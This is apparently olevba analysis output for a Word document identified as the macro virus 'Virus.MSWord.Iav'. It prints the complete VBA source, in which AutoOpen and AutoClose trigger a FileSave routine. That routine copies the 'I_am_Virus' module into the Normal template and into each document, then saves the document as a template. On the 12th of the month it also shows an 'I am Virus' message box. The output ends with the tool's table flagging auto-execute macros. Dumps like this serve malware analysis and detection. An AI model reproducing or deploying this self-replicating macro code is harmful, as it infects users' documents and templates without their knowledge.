olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Iav-47ddb9b619c7554a6f28aff3cc99a3dcfbc1a99d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Iav-47ddb9b619c7554a6f28aff3cc99a3dcfbc1a99d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO I_am_Virus.bas 
in file: Virus.MSWord.Iav-47ddb9b619c7554a6f28aff3cc99a3dcfbc1a99d - OLE stream: 'Macros/VBA/I_am_Virus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileSave()
Attribute FileSave.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.FileSave"
fnm = ActiveDocument.FullName
nm = ActiveDocument.Name
dot = NormalTemplate.FullName
cdr = CurDir()
cnm = Len(nm)
pix = Mid(nm, cnm - 3, 1)

Body

On Error Resume Next
 Application.OrganizerCopy Source:=dot, Destination:= _
        fnm, Name:="I_am_Virus", Object:=wdOrganizerObjectProjectItems

On Error Resume Next
Application.OrganizerCopy Source:=fnm, Destination:= _
       dot, Name:="I_am_Virus", Object:=wdOrganizerObjectProjectItems

10:
If pix = "." Then GoTo 11
fnm = cdr + "\" + nm + ".doc"
11:
    ActiveDocument.SaveAs FileName:=fnm, _
        FileFormat:=wdFormatTemplate
        
    End Sub
Sub Body()
dat_ = Date
day_of_month = Day(dat_)
If day_of_month <> "12" Then GoTo 99
MsgBox "      I am Virus", , "        Hello"
99:
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Ìàêðîñ ñîçäàí 14.04.01 Programmer"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
FileSave
End Sub
Sub AutoClose()
FileSave
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

